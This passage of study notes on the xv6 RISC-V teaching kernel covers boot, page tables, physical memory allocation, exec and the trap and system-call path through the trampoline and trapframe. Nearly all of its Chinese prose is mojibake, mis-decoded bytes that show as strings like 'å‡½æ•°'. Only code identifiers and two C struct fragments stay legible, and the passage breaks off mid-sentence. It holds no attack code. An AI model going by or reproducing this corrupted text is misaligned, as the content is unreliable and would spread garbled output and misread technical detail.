å‡½æ•° mret å¸¸ç”¨äºåœ¨å†…æ ¸æ¨¡å¼è°ƒç”¨è¿›å…¥æœºå™¨æ¨¡å¼åè¿”å›åˆ°å†…æ ¸æ¨¡å¼ start ä¼šå°†å‰ä¸€ä¸ªæ¨¡å¼è®¾ç½®ä¸ºå†…æ ¸æ¨¡å¼ï¼Œä»¥ä¾¿ç¬¦åˆ mret çš„æ¡ä»¶ main å‡½æ•° åˆå§‹åŒ–æ§åˆ¶å° åˆå§‹åŒ–ç‰©ç†é¡µåˆ†é…å™¨ åˆ›å»ºå†…æ ¸é¡µè¡¨ åŠ è½½å¯åŠ¨é¡µé¢ åˆå§‹åŒ–è¿›ç¨‹è¡¨ æ ¹æ®å†…æ ¸ä½ç½®è®¾ç½®ä»£ç ï¼ˆè®¾ç½® ecall çš„ä½ç½®ï¼Ÿï¼‰ åˆå§‹åŒ–ä¸­æ–­æ§åˆ¶ PLIC é€šè¿‡ä¸­æ–­è¯·æ±‚ PLIC è®¿é—®è®¾å¤‡ åˆå§‹åŒ– buffer ç¼“å­˜ åˆå§‹åŒ– inode ç¼“å­˜ åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿ åˆå§‹åŒ–ç£ç›˜ è¿›å…¥ userinit å‡½æ•° userinit å‡½æ•° åˆ›å»ºç¬¬ä¸€ä¸ªè¿›ç¨‹ æ‰§è¡Œç”¨ RISC-V ç¼–å†™çš„å°ç¨‹åºï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ åœ¨ user/initcode.S ä¸­æŠŠ SYS_exec ç³»ç»Ÿè°ƒç”¨å·ä¼ ç»™ a7 å¯„å­˜å™¨ï¼Œç„¶åè°ƒç”¨ ecall è¿›å…¥å†…æ ¸ å®‰å…¨æ¨¡å‹#todo çœŸå®ä¸–ç•Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿé‡‡ç”¨äº†è¿›ç¨‹çš„æ¦‚å¿µï¼Œä½†æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹æ”¯æŒå¤šä¸ªçº¿ç¨‹ï¼Œä»¥å…è®¸å•ä¸ªè¿›ç¨‹åˆ©ç”¨å¤šä¸ª CPUï¼Œæ½œåœ¨åœ°æ›´æ”¹äº†æ¥å£ï¼ˆå¦‚ Linux çš„ cloneï¼Œfork çš„ä¸€ç§å˜ä½“ï¼‰ï¼Œæ¥æ§åˆ¶çº¿ç¨‹å…±äº«çš„å„ä¸ªæ–¹é¢ Chapter 3 Page tables#todo åˆ†é¡µç¡¬ä»¶#todo å†…æ ¸åœ°å€ç©ºé—´#todo ä»£ç ï¼šåˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´å¤§å¤šæ•°å¤„ç†åœ°å€ç©ºé—´å’Œé¡µè¡¨çš„ä»£ç åœ¨ kernel/vm.c ä¸­ æ•°æ®ç»“æ„ pagetable_tï¼Œæ˜¯æŒ‡å‘ RISC-V æ ¹é¡µè¡¨çš„æŒ‡é’ˆ typedef uint64 *pagetable_tï¼Œå®ƒå¯ä»¥æ˜¯å†…æ ¸æˆ–æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨ ä¸­å¿ƒå‡½æ•°æ˜¯ walk å’Œ mappages walkï¼šä»é¡µè¡¨ä¸­æŸ¥æ‰¾è™šæ‹Ÿåœ°å€å¯¹åº”çš„ PTE mappagesï¼šä¸ºæ–°æ˜ å°„å®‰è£… PTE kvm å¼€å¤´çš„å‡½æ•°æ“ä½œå†…æ ¸é¡µè¡¨ uvm å¼€å¤´çš„å‡½æ•°æ“ä½œç”¨æˆ·é¡µè¡¨ copyin å’Œ copyout ç”¨äºç”¨æˆ·ä¸å†…æ ¸ä¹‹é—´ä¼ è¾“æ•°æ® ç³»ç»Ÿå¯åŠ¨ä¸€å¼€å§‹ï¼Œmain è°ƒç”¨ kvminit æ¥ä½¿ç”¨ kvmmake åˆ›å»ºå†…æ ¸é¡µè¡¨ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œåœ°å€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†å†…å­˜ ç„¶åè°ƒç”¨ kvminithart æ¥å®‰è£…å†…æ ¸é¡µè¡¨ï¼Œå°†æ ¹é¡µè¡¨çš„ç‰©ç†åœ°å€å†™å…¥ satp å¯„å­˜å™¨ï¼Œåœ¨æ­¤ä¹‹å CPU ä¼šä½¿ç”¨å†…æ ¸é¡µè¡¨è½¬æ¢åœ°å€ kvmmake é¦–å…ˆåˆ†é…ä¸€é¡µç‰©ç†å†…å­˜æ¥ä¿å­˜æ ¹é¡µè¡¨ ç„¶åè°ƒç”¨ kvmmap æ¥å®‰è£…å†…æ ¸éœ€è¦çš„ PTE åŒ…æ‹¬å†…æ ¸çš„æŒ‡ä»¤å’Œæ•°æ®ï¼Œæœ€é«˜åˆ° PHYSTOP çš„ç‰©ç†å†…å­˜ï¼Œè®¾å¤‡çš„å†…å­˜èŒƒå›´ ç„¶åè°ƒç”¨ proc_mapstacks ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ å®ƒè°ƒç”¨ kvmmap æŠŠæ¯ä¸ªæ ˆæ˜ å°„åˆ° KSTACK ç”Ÿæˆçš„è™šæ‹Ÿåœ°å€ï¼Œç•™å‡ºäº†ä¿æŠ¤é¡µçš„ç©ºé—´ kvmmap è°ƒç”¨ mappages å®‰è£… PTE mappages å®ƒå¯¹æ¯ä¸ªè™šæ‹Ÿåœ°å€å…ˆè°ƒç”¨ walk æŸ¥æ‰¾å¯¹åº”çš„ PTE åœ°å€ ç„¶ååˆå§‹åŒ– PTE ä¿å­˜å¯¹åº”çš„ PPN å’Œ æƒé™æ ‡å¿—ä½ walk å®ƒå¯¹ä¸‰çº§é¡µè¡¨è¿›è¡ŒæŸ¥è¯¢å¯¹åº”çš„ PTE è‹¥ PTE æ— æ•ˆä¸”è®¾ç½®äº† alloc å‚æ•°ï¼Œwalk ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢ï¼Œå¹¶æŠŠç‰©ç†åœ°å€æ”¾å…¥ PTE æœ€åè¿”å›ç¬¬ä¸‰çº§é¡µè¡¨çš„ PTE åœ°å€ ç‰©ç†å†…å­˜åˆ†é…xv6 åœ¨å†…æ ¸ç»“å°¾ä¸ PHSYTOP ä¹‹é—´åˆ†é…è¿è¡Œæ—¶å†…å­˜ï¼Œä¸€æ¬¡åˆ†é…å’Œé‡Šæ”¾ 4KB xv6 è¿½è¸ªå“ªäº›é¡µé¢æ˜¯ freedï¼Œé€šè¿‡å»ºç«‹ä¸€ä¸ªé“¾è¡¨ åˆ†é…åŒ…æ‹¬ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œé‡Šæ”¾åŒ…æ‹¬å°† freed é¡µåŠ å…¥ä»é“¾è¡¨ä¸­ ä»£ç ï¼šç‰©ç†å†…å­˜åˆ†é…å™¨åˆ†é…å™¨ä½äº kernel/kalloc.c ä¸­ æ•°æ®ç»“æ„æ˜¯ä¸€ä¸ª free é“¾è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ struct runï¼Œé“¾è¡¨ç”±ä¸€ä¸ª spin lock ä¿æŠ¤ï¼Œé”è°ƒç”¨ acquire å’Œ releaseï¼Œé“¾è¡¨å’Œé”è¢«åŒ…è£…åœ¨ kmem ç»“æ„ä½“ä¸­ kernel/kalloc.c1234struct { struct spinlock lock; struct run *freelist;} kmem; xv6 åº”è¯¥é€šè¿‡è§£æç¡¬ä»¶çš„é…ç½®ä¿¡æ¯æ¥å†³å®šæœ‰å¤šå°‘ç‰©ç†å†…å­˜å¯ç”¨ main å‡½æ•°è°ƒç”¨ kinit æ¥åˆå§‹åŒ–åˆ†é…å™¨ kinit åˆå§‹åŒ– free é“¾è¡¨æ¥ä¿å­˜ free memory çš„æ¯ä¸€é¡µï¼ˆkernel æœ«å°¾ä¸ PHSYTOP ä¹‹é—´çš„å†…å­˜ç©ºé—´ï¼‰ kinit è°ƒç”¨ freerange æ¥å¯¹æ¯ä¸€é¡µè°ƒç”¨ kfree å‘ free é“¾è¡¨æ·»åŠ å†…å­˜ freerange ä½¿ç”¨ PGROUNDUP ç¡®ä¿ç‰©ç†åœ°å€å¯¹é½ï¼ˆç±»ä¼¼å‘ä¸Šå–æ•´ï¼‰ kfree ä¼šå°†é‡Šæ”¾çš„é¡µé¢æ‰€æœ‰å€¼è®¾ä¸º 1ï¼Œç„¶åä½¿ç”¨å¤´æ’æ³•å°†é¡µé¢é¦–åœ°å€åŠ å…¥ free é“¾è¡¨ è¿›ç¨‹åœ°å€ç©ºé—´æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨| Address | section | Permission || â€”â€”â€”â€” | â€”â€”â€”- | â€”â€”â€”- || MAXVA | trapline | RXâ€“ || | trapframe | R-W- || | unused | || | heap | R-WU || | stack | R-WU || | guard page | || | data | R-WU || Page aligned | unused | || 0 | text | R-XU | trampoline å’Œ trapframe æ˜ å°„åœ¨é«˜åœ°å€ï¼Œç”¨æˆ·æ¨¡å¼ä¸å¯è®¿é—® trampolineï¼šåœ¨è°ƒç”¨ ecall æ—¶ä¼šè·³è½¬åˆ°è¿™é‡Œ trapframeï¼šåœ¨è°ƒç”¨ ecall æ—¶ï¼Œç”¨æˆ·è¿›ç¨‹çš„é€šç”¨å¯„å­˜å™¨ä¼šä¿å­˜åœ¨è¿™é‡Œ ä»£ç ï¼šsbrkç³»ç»Ÿè°ƒç”¨ sbrk ç”¨äºè¿›ç¨‹å¢å‡å†…å­˜å¤§å°ï¼Œç”± growproc å®ç° growproc æ ¹æ® n çš„æ­£è´Ÿï¼Œè°ƒç”¨ uvmalloc æˆ– uvmdealloc uvmalloc è°ƒç”¨ kalloc åˆ†é…ç‰©ç†å†…å­˜ï¼Œç„¶åè°ƒç”¨ mappages å‘ç”¨æˆ·é¡µè¡¨æ·»åŠ  PTE uvmdealloc è°ƒç”¨ uvmunmapï¼Œuvmunmap ä½¿ç”¨ walk æ‰¾åˆ°å¯¹åº”çš„ PTE å’Œ kfree é‡Šæ”¾ç‰©ç†å†…å­˜ ä»£ç ï¼šexecexec ä½¿ç”¨ namei æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åè¯»å– ELF å¤´ ä¸€ä¸ª ELF æ–‡ä»¶åŒ…å«ä¸€ä¸ª ELF å¤´ï¼ˆstruct elfhdrï¼‰ï¼Œä¸€ç³»åˆ—ç¨‹åº section å¤´ï¼ˆstruct proghdrï¼‰ï¼Œæ¯ä¸ª struct proghdr æè¿°äº†ç¨‹åºå¿…é¡»åŠ è½½åˆ°å†…å­˜ä¸­çš„ sectionï¼Œxv6 ç¨‹åºæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæŒ‡ä»¤ï¼Œä¸€ä¸ªæ˜¯æ•°æ® ç¬¬ä¸€æ­¥æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ˜¯ ELF æ–‡ä»¶ï¼Œå®ƒä» 4 å­—èŠ‚çš„é­”æœ¯æ•°å­—å¼€å§‹ï¼ˆ0x7Fï¼Œâ€™Eâ€™ï¼Œâ€™Lâ€™ï¼Œâ€™Fâ€™ï¼Œæˆ–è€… ELF_MAGICï¼‰ ä½¿ç”¨ proc_pagetable åˆ†é…ä¸€ä¸ªæ²¡æœ‰ç”¨æˆ·æ˜ å°„çš„æ–°é¡µè¡¨ï¼Œç”¨ uvmalloc ç»™æ¯ä¸ª ELF æ®µåˆ†é…å†…å­˜ï¼Œç”¨ loadseg åŠ è½½æ¯ä¸ªæ®µåˆ°å†…å­˜ä¸­ï¼Œloadseg ä½¿ç”¨ walkaddr æ‰¾åˆ°ç‰©ç†åœ°å€å†™å…¥æ¯ä¸ªæ®µã€‚ä½¿ç”¨ readi è¯»å–æ¯ä¸ªæ®µ åˆ†é…å¹¶åˆå§‹åŒ–ä¸€é¡µç”¨æˆ·æ ˆï¼Œå°†å‚æ•°å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ ˆé¡¶ï¼Œåœ¨ ustack è®°å½•å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œustack å‰ä¸‰ä¸ªæ˜¯ fake è¿”å›ç¨‹åºè®¡æ•°å™¨ï¼Œargc å’Œ argv exec ä¼šåœ¨æ ˆé¡µçš„ä¸‹é¢æ”¾ä¸€ä¸ªä¸å¯è®¿é—®çš„é¡µ åœ¨å‡†å¤‡æ–°çš„å†…å­˜é•œåƒæ—¶ï¼Œå¦‚æœæ£€æµ‹åˆ°ä¸€ä¸ªé”™è¯¯ï¼ˆå¦‚æ— æ•ˆçš„ç¨‹åºæ®µï¼‰ï¼Œä¼šè·³è½¬åˆ° bad æ ‡ç­¾ï¼Œé‡Šæ”¾æ–°çš„é•œåƒï¼Œè¿”å› -1ã€‚ä¸€æ—¦é•œåƒå®Œæˆï¼Œexec æäº¤æ–°çš„é¡µè¡¨ï¼Œé‡Šæ”¾æ—§çš„ exec ä»æ–‡ä»¶æŒ‡å®šçš„åœ°å€å°†æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤ exec æ˜¯æœ‰é£é™©çš„ï¼Œéœ€è¦æ‰§è¡Œå¾ˆå¤šæ£€æŸ¥ Real worldçœŸæ­£çš„å†…å­˜åˆ†é…å™¨éœ€è¦å¤„ç†å°åˆ†é…å’Œå¤§åˆ†é… Chapter 4 Traps and system callstrapï¼ˆé™·é˜±ï¼‰æ˜¯è®©CPU æç½®æ™®é€šæŒ‡ä»¤çš„æ‰§è¡Œï¼Œå¹¶å°†æ§åˆ¶æƒè½¬ç§»åˆ°å¤„ç†è¯¥äº‹ä»¶çš„ç‰¹æ®Šä»£ç  ç³»ç»Ÿè°ƒç”¨ å¼‚å¸¸ é™¤ä»¥ 0 æˆ–ä½¿ç”¨æ— æ•ˆçš„è™šæ‹Ÿåœ°å€ç­‰ ä¸­æ–­ è®¾å¤‡å‘å‡ºä¿¡å·ï¼Œå¦‚ç£ç›˜å®Œæˆè¯»å†™è¯·æ±‚æ—¶ é€šå¸¸ï¼Œtrap å‘ç”Ÿæ—¶æ‰§è¡Œçš„ä»£ç ä¸ä¹…åéƒ½éœ€è¦æ¢å¤ï¼Œä»£ç å¹¶ä¸éœ€è¦æ„è¯†åˆ°å‘ç”Ÿäº†ä»»ä½•ç‰¹æ®Šæƒ…å†µ å¼‚å¸¸å¤„ç† trap å¼ºåˆ¶å°†æ§åˆ¶æƒè½¬ç§»ç»™å†…æ ¸ å†…æ ¸ä¿å­˜å¯„å­˜å™¨å’Œå…¶ä»–çŠ¶æ€ å†…æ ¸æ‰§è¡Œå¤„ç†ä»£ç  å†…æ ¸æ¢å¤ä¿å­˜çš„å¯„å­˜å™¨å’ŒçŠ¶æ€å¹¶ä»é™·é˜±ä¸­è¿”å› åŸå§‹ä»£ç ä»å®ƒåœæ­¢çš„åœ°æ–¹æ¢å¤ Xv6 åœ¨å†…æ ¸ä¸­å¤„ç†æ‰€æœ‰ trapï¼Œtrap ä¸ä¼šä¼ é€’ç»™ç”¨æˆ·ä»£ç  éš”ç¦»è¦æ±‚åªæœ‰å†…æ ¸å¯ä»¥ä½¿ç”¨ç¡¬ä»¶è®¾å¤‡ï¼Œä¸”å†…æ ¸æ˜¯ä¸€ç§æ–¹ä¾¿çš„æœºåˆ¶ï¼Œå¯ä»¥åœ¨å¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«è®¾å¤‡ï¼Œä¸äº’ç›¸å¹²æ‰°ï¼Œè¿™å¯¹äºå¼‚å¸¸ä¹Ÿæœ‰æ„ä¹‰ï¼Œxv6 é€šè¿‡æ€æ­»è¿è§„ç¨‹åºæ¥å¤„ç†ç”¨æˆ·ç©ºé—´çš„æ‰€æœ‰å¼‚å¸¸ Xv6 å¤„ç† trap æœ‰å››ä¸ªé˜¶æ®µ RISC-V CPU è¿›è¡Œç¡¬ä»¶æ“ä½œ ä¸€äº›ä¸ºå†…æ ¸ C ä»£ç åšå¥½å‡†å¤‡çš„æ±‡ç¼–æŒ‡ä»¤ å†³å®šå¦‚ä½•å¤„ç† trap çš„ C å‡½æ•° ç³»ç»Ÿè°ƒç”¨æˆ–è®¾å¤‡é©±åŠ¨ç¨‹åºæœåŠ¡ä¾‹ç¨‹ å¤„ç† trap çš„ä»£ç ï¼ˆæ±‡ç¼–æˆ– Cï¼‰è¢«ç§°ä¸º handler handler çš„ç¬¬ä¸€æ­¥é€šå¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ï¼Œç§°ä¸º vector RISC-V trap æœºåˆ¶å¯„å­˜å™¨æ§åˆ¶å¯„å­˜å™¨ï¼šå†…æ ¸å¯è¯»å†™ï¼Œç”¨äºå‘Šè¯‰ CPU æ€ä¹ˆå¤„ç† trap stvecï¼šä¿å­˜å†…æ ¸å¤„ç† trap çš„åœ°å€ï¼Œå‘ç”Ÿ trap æ—¶ä¼šè·³è½¬åˆ°è¯¥åœ°å€ Supervisor Trap Vector ç”¨æˆ·æ¨¡å¼ä¸‹ä¼šæŒ‡å‘å†…æ ¸ä»£ç çš„ usertrap å†…æ ¸æ¨¡å¼ä¸‹ä¼šæŒ‡å‘å†…æ ¸ä»£ç çš„ kerneltrap sepcï¼šå‘ç”Ÿ trap æ—¶ä¿å­˜å½“å‰çš„ pcï¼Œåœ¨ä½¿ç”¨ sret æŒ‡ä»¤æ—¶ï¼Œä¼šè·³è½¬åˆ° sepc æŒ‡å‘çš„åœ°å€ Supervisor Exception Program Counter sretï¼šä» trap è¿”å› å†…æ ¸å¯æ§åˆ¶ sepc è®© sret è¿”å›åˆ°é€‚å½“çš„ä½ç½® scauseï¼šæè¿° trap ç±»å‹ Supervisor Trap Cause 8 è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨ å…¶ä»–è¡¨ç¤ºé”™è¯¯æˆ–è€…ä¸­æ–­ sscatchï¼šè¾…åŠ©ä½œç”¨ï¼Œé˜²æ­¢åœ¨ä¿å­˜ç”¨æˆ·å¯„å­˜å™¨å‰å°†å…¶è¦†ç›– ä¸€èˆ¬ç”¨æ¥ä¿å­˜ a0 åœ¨ xv6 çš„ 2020 ç‰ˆæœ¬ç”¨æ¥ä¿å­˜ trapframe åœ°å€ sstatusï¼šä»¥ bitmap å½¢å¼ä¿å­˜ä¸€äº›æ§åˆ¶ä¿¡æ¯ Supervisor Status SPPï¼šè¡¨ç¤º trap æ¥è‡ªç”¨æˆ·æ¨¡å¼ï¼ˆ0ï¼‰è¿˜æ˜¯ç®¡ç†è€…æ¨¡å¼ï¼ˆ1ï¼‰ï¼Œå¹¶ä¸”ç”¨æ¥å‘Šè¯‰ sret è¿”å›åˆ°å“ªä¸ªæ¨¡å¼ SIEï¼šè¡¨ç¤ºæ˜¯å¦å…è®¸è®¾å¤‡ä¸­æ–­ï¼Œè‹¥ä¸º 0 åˆ™ RISC-V ä¼šæ¨è¿Ÿè®¾å¤‡ä¸­æ–­ åœ¨æœºå™¨æ¨¡å¼ä¸‹æœ‰ä¸€ç»„ç±»ä¼¼çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œxv6 åªåœ¨å®šæ—¶å™¨ä¸­æ–­çš„æƒ…å†µä¸‹ä½¿ç”¨ å¤„ç† trap å‰ä¸‹é¢æ˜¯é™¤ å®šæ—¶å™¨ä¸­æ–­ å¤–çš„ trap å°† sstatus çš„ SIE ä½ ç½®é›¶ å¦‚æœæ˜¯è®¾å¤‡ä¸­æ–­ï¼Œä¸ä¼šç»§ç»­ä¸‹é¢çš„æ“ä½œ å°† pc å¤åˆ¶ç»™ sepc ä¿å­˜å½“å‰æ¨¡å¼åˆ° sstatus çš„ SSP è®¾ç½® scause è¡¨ç¤º trap åŸå›  è®¾ç½®ä¸ºç®¡ç†è€…æ¨¡å¼ å°† stvec å¤åˆ¶ç»™ pc å¼€å§‹æ‰§è¡Œæ–°çš„ pc æŒ‡å‘çš„æŒ‡ä»¤ æ³¨æ„ï¼šæ­¤æ—¶æ²¡æœ‰è½¬æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼Œæ²¡æœ‰è½¬æ¢ä¸ºå†…æ ¸æ ˆï¼Œä¹Ÿæ²¡æœ‰ä¿å­˜é™¤ pc å¤–çš„ä»»ä½•å¯„å­˜å™¨ï¼Œè¿™äº›éœ€è¦ç”±å†…æ ¸æ¥å®ç° åŸå› ï¼šè¿™æ ·èƒ½æä¾›ç»™å†…æ ¸æ›´å¥½çš„çµæ´»æ€§ï¼Œä¾‹å¦‚åœ¨å†…æ ¸ä¸­å‘ç”Ÿ trap å¹¶ä¸éœ€è¦è½¬æ¢é¡µè¡¨ï¼Œå¯ä»¥æé«˜å¤„ç† trap çš„æ€§èƒ½ ç›¸å…³çš„æ±‡ç¼–æŒ‡ä»¤ ecall environment call ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€ç§ trap sret Supervisor Return å°†æ¨¡å¼ä»ç®¡ç†è€…æ¨¡å¼æ›´æ”¹ä¸ºæŒ‡å®šçš„æ¨¡å¼ï¼ˆsstatus çš„ SPP ä½ï¼‰ å°† sepc å¯„å­˜å™¨å¤åˆ¶ç»™ pc å¯„å­˜å™¨ å¯ç”¨è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 1ï¼‰ csrw å†™å…¥æ§åˆ¶å¯„å­˜å™¨ csrw sscratch, a0 csrr è¯»å–æ§åˆ¶å¯„å­˜å™¨ csrr t0, sscratch ç”¨æˆ· trapæ¥è‡ªç”¨æˆ·ç©ºé—´çš„ trap çš„å¤„ç†æµç¨‹ uservecï¼ˆkernel/trampoline.Sï¼‰ usertrapï¼ˆkernel/trap.cï¼‰ usertrapretï¼ˆkernel/trap.cï¼‰ userretï¼ˆkernel/trapline.Sï¼‰ trampolineç”±äºRISC-V ç¡¬ä»¶åœ¨å‘ç”Ÿ trap æ—¶ä¸ä¼šè½¬æ¢é¡µè¡¨ï¼Œè¿™æ„å‘³ç€ stvec ä¿å­˜çš„åœ°å€ï¼ˆå¤„ç† trap çš„åœ°å€ï¼‰å¿…é¡»åœ¨ç”¨æˆ·é¡µè¡¨ä¸­å­˜åœ¨æœ‰æ•ˆæ˜ å°„ï¼Œå¹¶ä¸”åœ¨è½¬æ¢æˆå†…æ ¸é¡µè¡¨åï¼Œå¿…é¡»åœ¨å†…æ ¸é¡µè¡¨ä¸­ä¹Ÿå­˜åœ¨æœ‰æ•ˆæ˜ å°„ Xv6 ä½¿ç”¨äº†ä¸€ä¸ª trampoline é¡µè¡¨æ¥è§£å†³ä¸Šé¢çš„é™åˆ¶æ¡ä»¶ trampoline é¡µé¢åŒ…å« stvec æŒ‡å‘çš„ uservec ç¨‹åºå’Œç”¨äºè¿”å›åˆ°ç”¨æˆ·ä»£ç çš„ userret ç¨‹åº trampoline åœ¨å†…æ ¸æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨ä¸­éƒ½æ˜ å°„åˆ°äº† TRAMPOLINEï¼ˆ0x3ffffff000ï¼‰åœ°å€ä¸Šï¼Œä½äºè™šæ‹Ÿåœ°å€é¡¶éƒ¨ï¼Œå®ƒåªå…è®¸ç®¡ç†è€…æ¨¡å¼æ‰§è¡Œ trapframeé€šç”¨å¯„å­˜å™¨å†…å®¹ä¼šä¿å­˜åˆ°ä¸€ä¸ª trapframe ç»“æ„ä½“ï¼Œå®ƒé€šå¸¸åœ¨ç”¨æˆ·é¡µè¡¨ä¸­æ˜ å°„åˆ°ä¸ trampoline ç›¸é‚»çš„ä½ç½®ï¼ˆ0x3fffffe000ï¼‰ï¼Œä¸”ä¹Ÿåªå…è®¸ç®¡ç†è€…æ¨¡å¼è®¿é—® å®ƒçš„ç‰©ç†åœ°å€ä¿å­˜åœ¨ proc ç»“æ„ä½“çš„ trapframe æˆå‘˜å˜é‡ä¸­ï¼Œä»¥ä¾¿å†…æ ¸èƒ½é€šè¿‡å†…æ ¸é¡µè¡¨ç›´æ¥è®¿é—®å®ƒ kernel/proc.h12345678struct trapframe { /* 0 */ uint64 kernel_satp; // kernel page table /* 8 */ uint64 kernel_sp; // top of process's kernel stack /* 16 */ uint64 kernel_trap; // usertrap() /* 24 */ uint64 epc; // saved user program counter /* 32 */ uint64 kernel_hartid; // saved kernel tp ...}; kernel_satp ä¿å­˜ kernel é¡µè¡¨åœ°å€ kernel_sp ä¿å­˜è¿›ç¨‹çš„å†…æ ¸æ ˆé¡¶åœ°å€ kernel_trap ä¿å­˜å†…æ ¸ä»£ç ä¸­çš„ usertrap ä½ç½® epc ä¿å­˜ç”¨æˆ·çš„ pc åœ¨ usertrap() ä¸­ä¼šå°† sepc å¯„å­˜å™¨å†…å®¹ä¿å­˜åˆ°è¿™é‡Œ å› ä¸ºå¯èƒ½ä¼šè·³è½¬åˆ°å¦ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å»æ‰§è¡Œï¼Œsepc å¯„å­˜å™¨å¯èƒ½ä¼šè¢«æ›´æ”¹ kernel_hartid CPU æ ¸å¿ƒ idï¼Œè¡¨ç¤ºè¯¥è¿›ç¨‹åœ¨å“ªä¸ª CPU æ ¸å¿ƒè¿è¡Œï¼Œä» 0 å¼€å§‹ å‰©ä¸‹çš„æ˜¯é€šç”¨å¯„å­˜å™¨ uservecuservec ä»£ç ä½äº kernel/trampoline.S ä¸­ å®ƒçš„ä½œç”¨æ˜¯ä¿å­˜ç”¨æˆ·ä»£ç çš„é€šç”¨å¯„å­˜å™¨ï¼Œåˆ‡æ¢å†…æ ¸æ ˆã€å†…æ ¸é¡µè¡¨ç­‰ï¼Œè·³è½¬åˆ°å†…æ ¸ä¸­å¤„ç† trap çš„ä½ç½® usertrapï¼ˆkernel/proc.cï¼‰ usertrapusertrap ä»£ç ä½äº kernel/trap.c ä¸­ å®ƒçš„ä½œç”¨æ˜¯ç¡®å®š trap çš„åŸå› ï¼Œå¤„ç†å®ƒå¹¶è¿”å› é¦–å…ˆå°† stvec æ›´æ”¹ä¸º kernelvecï¼ˆkernel/kenelvec.Sï¼‰ï¼Œè¿™æ ·åœ¨å†…æ ¸ä¸­å‘ç”Ÿ trap æ—¶ï¼Œä¼šè¿›å…¥ kerneltrap è¿›è¡Œå¤„ç†ï¼Œè€Œä¸ä¼šè¿›å…¥ usertrap å°† sepc ä¿å­˜åˆ° trapframe ä¸­ï¼Œå› ä¸º trap æœ‰å¯èƒ½æ—¶è®¡æ—¶å™¨ä¸­æ–­ï¼Œè½¬æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹å»æ‰§è¡Œï¼Œä¼šå°† sepc è¦†ç›– æ ¹æ® trap ç§ç±» ç³»ç»Ÿè°ƒç”¨ p-&gt;trapframe-&gt;epc +=4 è¿™æ ·åœ¨å›åˆ°ç”¨æˆ·è¿›ç¨‹æ—¶ï¼Œä¼šæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè€Œä¸æ˜¯å†æ‰§è¡Œ ecall å¯ç”¨è®¾å¤‡ä¸­æ–­ è°ƒç”¨ syscall æ¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ è®¾å¤‡ä¸­æ–­ è°ƒç”¨ devintr å¤„ç† å¼‚å¸¸ æ€æ­»å‡ºé”™çš„è¿›ç¨‹ æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¢«æ€æ­»ï¼Œè‹¥æ€æ­»åˆ™è°ƒç”¨ exit é€€å‡º æ£€æŸ¥æ˜¯å¦æ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ yield æ”¾å¼ƒ CPU usertrapretusertrapret ä»£ç ä½äº kernel/trap.c ä¸­ å®ƒçš„ä½œç”¨æ˜¯è®¾ç½® trapframe å’Œæ§åˆ¶å¯„å­˜å™¨ å°† stvec æ›´æ”¹ä¸º uservecï¼ˆkernel/trampoline.Sï¼‰ è®¾ç½® trapframe ä¸­ uservec éœ€è¦ä½¿ç”¨çš„å­—æ®µ è®¾ç½® sstatus è®¾ç½® sepc ä¸ºä¹‹å‰ä¿å­˜çš„ pc å°†ç”¨æˆ·é¡µè¡¨æ”¾å…¥ a0 ä¼ é€’ç»™ userret userretuserret ä»£ç ä½äº kernel/trampoline.S ä¸­ å®ƒçš„ä½œç”¨æ˜¯åˆ‡æ¢ä¸ºç”¨æˆ·é¡µè¡¨ï¼Œä» trapframe ä¸­æ¢å¤é€šç”¨å¯„å­˜å™¨ï¼Œè°ƒç”¨ sret è·³è½¬ sepc æŒ‡å‘çš„åœ°å€ï¼Œè¿”å›åˆ°ç”¨æˆ·æ¨¡å¼ ä»£ç ï¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨user/initcode.S å°† exec çš„å‚æ•°æ”¾åœ¨ a0 å’Œ a1 å¯„å­˜å™¨ä¸­ï¼ŒæŠŠç³»ç»Ÿè°ƒç”¨å·æ”¾åœ¨ a7 ä¸­ ecall æŒ‡ä»¤è¿›å…¥å†…æ ¸ï¼Œæ‰§è¡Œ uservecã€usertrap å’Œ syscall æ‰§è¡Œ syscall åœ¨ trapframe ä¸­æ£€ç´¢ a7 ä¿å­˜çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå¹¶ç”¨å®ƒç´¢å¼•åˆ° syscall ä¸­ å½“ syscall è¿”å›æ—¶ï¼Œå°†è¿”å›å€¼è®°å½•åˆ° p-&gt;trapframe-&gt;a0 ä¸­ ç„¶åç”¨æˆ·ç©ºé—´çš„ exec 